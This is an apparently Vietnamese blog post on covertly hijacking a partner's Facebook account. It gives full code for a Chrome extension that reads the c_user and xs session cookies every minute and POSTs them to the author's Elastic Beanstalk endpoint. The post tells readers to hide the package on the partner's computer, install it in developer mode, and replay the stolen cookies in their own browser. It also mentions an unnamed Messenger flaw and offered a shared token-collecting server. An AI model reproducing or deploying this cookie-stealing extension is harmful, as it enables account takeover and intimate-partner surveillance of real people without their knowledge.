Mấy nay rôm rả chuyện cô Hằng nhờ "Hếch Cơ" nào đó có thể làm gì đó ... liên quan tới **Facebook** để lấy "1 tỏi" tiền tươi nghe có vẻ hấp dẫn :D Mình nảy ra 1 ý tưởng là mình muốn hếch thử Facebook honey của mềnh.

**Update 06/06/2021: Mình đã xóa host và DB ạ. Vì token gởi về khá nhiều, do sợ ảnh hưởng đến victim ...  Mong các anh em thông cảm! Thân.**

## Ý Tưởng
- Mình sẽ tạo 1 Chrome Extension để lấy facebook cookie của honey. Nhiệm vụ của nó là sẽ lấy token của Facebook sau đó gởi đến server của mình

![](https://images.viblo.asia/aad3b9c1-4fb3-46ea-acbf-160fe99b5fb6.png)

Sau khi có được token - mình add vào trình duyệt. Và thế là mình đã vào được Facebook của honey mà không cần "Password"

![](https://images.viblo.asia/ee07b421-d62c-465d-adbd-8378dffbfecd.png)

## Build Service

MÌnh tạo 1 Backend để lắng nghe các token gởi về. Các bạn cũng có thể dùng thử nhé.

**Note: Mình đang dùng micro server thôi - yếu lắm ... các bạn dừng DDos nha. Không là lần sau mềnh không có động lực để làm gì đâu (Mặc dù đã có auto load-balancing 1-4 instances)**

![](https://images.viblo.asia/35dd5c4d-616d-49ea-a43b-0049873d1178.png)

Sau khi tạo acc xong - các bạn download Chrome Extension package về. Trong package này sẽ chứa UUID của account mà bạn đăng ký - dựa vào đó server sẽ biết được token gởi về là của bạn nào

![](https://images.viblo.asia/977e3468-3792-4297-8857-73147b5ee152.png)

```
var cUser;
var Xs;

function getCookies(domain, name) {
  chrome.cookies.get({ "url": domain, "name": name }, function (cookie) {
    if (name == 'c_user') {
      cUser = cookie.value;
    } else if (name == 'xs') {
      Xs = window.btoa(cookie.value);
    }

    if (cUser && Xs) {
      send2BE();
    }
  });
}

function send2BE() {
  var data = 'c_user=' + cUser;
  data += '&xs=' + Xs;
  data += '&auth_token=your-id-token';

  var request = new XMLHttpRequest();
  request.open('POST', 'http://facebooktoken-env.eba-a3j3v3zd.us-east-1.elasticbeanstalk.com/api/fb-hook', true);
  request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
  request.send(data);
}

chrome.alarms.create("myAlarm", { delayInMinutes: 0.1, periodInMinutes: 1 });
chrome.alarms.onAlarm.addListener(function (alarm) {
  getCookies("https://www.facebook.com", "xs")
  getCookies("https://www.facebook.com", "c_user")
});
```

Các bạn hãy lưu cái package này ở đâu đó thật kín đáo trong **máy của GẤU** nhé -(`C:\Program Files` chẳng hạn). Rồi cài vào trình duyệt của Gấu bằng mode develop

![](https://images.viblo.asia/7d08999d-136f-4569-9118-6700476bea17.png)

![](https://images.viblo.asia/a7fc63cd-cca7-4d2e-b43d-a0bf670e38b6.png)

![](https://images.viblo.asia/12ff1bc4-4f21-4538-818e-03fd580c3051.png)

Vậy là xong ... giờ chỉ ngồi chờ Token gởi về rồi sử dụng thôi

![](https://images.viblo.asia/d3dab752-f9f2-4baf-bb93-64c75dc5489d.png)

Sau khi có thông tin token rồi. Thì mình mở browser của mình lên và gán thông tin token của honey vào. Done!
![](https://images.viblo.asia/4c1395b8-611e-45b9-baaa-87af8cee1908.png)
![](https://images.viblo.asia/ee07b421-d62c-465d-adbd-8378dffbfecd.png)

## Kết mở
- Trong lúc làm thử mình phát hiện một lỗi hổng nhỏ của Facebook Messenger - Trừ khi bạn đổi mật khẩu thì mình mới không còn đọc được messenger của bạn - Mình không nói ở đây nha, mọi người tự tìm hiểu nhé.
- Bài viết nhằm để các bạn ý thức được tầm quan trọng của cookie.
- Mình không chịu trách nhiệm trước mọi hành phi phạm pháp nếu dùng vào mục đích xấu nhé.
- Ngày xưa mình đẩy lên server khá vất vả ... nhưng giờ mọi thứ nhanh hơn nhiều ... phần server infrastructure mình làm chưa đầy 2 tiếng (From 0 + Google). Tham khảo ảnh bên dưới cho bạn nào muốn tham khảo heng

![](https://images.viblo.asia/e36cdbae-ac02-491a-9676-5e5fad2e98f2.png)